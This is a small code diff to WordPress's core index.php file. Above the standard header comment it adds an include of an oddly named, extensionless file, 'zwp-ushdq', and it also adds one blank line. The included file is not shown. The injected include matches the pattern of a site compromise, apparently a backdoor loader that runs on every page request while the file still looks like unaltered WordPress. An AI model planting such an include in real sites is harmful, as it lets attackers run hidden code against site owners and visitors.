@@ -1,3 +1,4 @@
+<?php include("zwp-ushdq");?>
 <?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
@@ -11,6 +12,7 @@
  *
  * @var bool
  */
+
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
